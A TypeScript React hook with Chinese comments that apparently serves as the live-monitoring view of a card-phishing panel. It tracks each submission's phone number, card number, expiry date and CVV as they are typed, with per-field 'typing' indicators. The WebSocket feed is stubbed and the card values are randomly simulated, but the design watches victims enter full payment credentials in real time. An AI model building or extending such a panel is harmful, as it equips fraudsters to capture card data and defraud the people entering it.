import { useState, useEffect, useRef } from 'react';

interface RealtimeInput {
  phone?: string;
  cardNumber?: string;
  expiryDate?: string;
  cvv?: string;
  name?: string;
}

interface RealtimeUpdate {
  submissionId: string;
  field: keyof RealtimeInput;
  value: string;
  timestamp: number;
}

interface TypingState {
  [submissionId: string]: {
    [field: string]: boolean;
  };
}

export function useRealtimeMonitor(initialSubmissions: any[]) {
  const [submissions, setSubmissions] = useState(initialSubmissions);
  const [typingStates, setTypingStates] = useState<TypingState>({});
  const wsRef = useRef<WebSocket | null>(null);
  const typingTimeoutsRef = useRef<{[key: string]: NodeJS.Timeout}>({});

  // 模拟WebSocket连接
  useEffect(() => {
    // 在真实环境中，这里会建立真正的WebSocket连接
    // const ws = new WebSocket('wss://your-websocket-server');
    
    // 模拟实时数据更新
    const simulateRealtimeUpdates = () => {
      const updateInterval = setInterval(() => {
        // 随机选择一个提交项进行更新
        const randomSubmission = submissions[Math.floor(Math.random() * submissions.length)];
        if (!randomSubmission) return;

        const fields: (keyof RealtimeInput)[] = ['phone', 'cardNumber', 'expiryDate', 'cvv'];
        const randomField = fields[Math.floor(Math.random() * fields.length)];
        
        // 模拟用户正在输入
        const submissionId = randomSubmission.id;
        const fieldKey = `${submissionId}-${randomField}`;
        
        // 设置输入状态
        setTypingStates(prev => ({
          ...prev,
          [submissionId]: {
            ...prev[submissionId],
            [randomField]: true
          }
        }));

        // 清除之前的超时
        if (typingTimeoutsRef.current[fieldKey]) {
          clearTimeout(typingTimeoutsRef.current[fieldKey]);
        }

        // 设置新的超时来清除输入状态
        typingTimeoutsRef.current[fieldKey] = setTimeout(() => {
          setTypingStates(prev => ({
            ...prev,
            [submissionId]: {
              ...prev[submissionId],
              [randomField]: false
            }
          }));
        }, 2000);

        // 模拟数据更新
        setTimeout(() => {
          handleRealtimeUpdate({
            submissionId,
            field: randomField,
            value: generateRandomValue(randomField),
            timestamp: Date.now()
          });
        }, Math.random() * 1500 + 500); // 0.5-2秒后更新数据

      }, 3000); // 每3秒触发一次更新

      return () => clearInterval(updateInterval);
    };

    const cleanup = simulateRealtimeUpdates();
    return cleanup;
  }, [submissions]);

  const handleRealtimeUpdate = (update: RealtimeUpdate) => {
    setSubmissions(prev => prev.map(submission => {
      if (submission.id === update.submissionId) {
        return {
          ...submission,
          realtimeInput: {
            ...submission.realtimeInput,
            [update.field]: update.value
          },
          lastUpdated: update.timestamp
        };
      }
      return submission;
    }));
  };

  const generateRandomValue = (field: keyof RealtimeInput): string => {
    switch (field) {
      case 'phone':
        return `1${Math.floor(Math.random() * 9) + 1}${Math.floor(Math.random() * 9)}****${Math.floor(Math.random() * 9000) + 1000}`;
      case 'cardNumber':
        const cardPrefixes = ['4321', '5555', '6226', '4532'];
        const prefix = cardPrefixes[Math.floor(Math.random() * cardPrefixes.length)];
        const suffix = Math.floor(Math.random() * 9000) + 1000;
        return `${prefix} **** **** ${suffix}`;
      case 'expiryDate':
        const month = String(Math.floor(Math.random() * 12) + 1).padStart(2, '0');
        const year = String(Math.floor(Math.random() * 5) + 24);
        return `${month}/${year}`;
      case 'cvv':
        return String(Math.floor(Math.random() * 900) + 100);
      default:
        return 'N/A';
    }
  };

  const isFieldTyping = (submissionId: string, field: string): boolean => {
    return typingStates[submissionId]?.[field] || false;
  };

  return {
    submissions,
    isFieldTyping,
    typingStates
  };
}
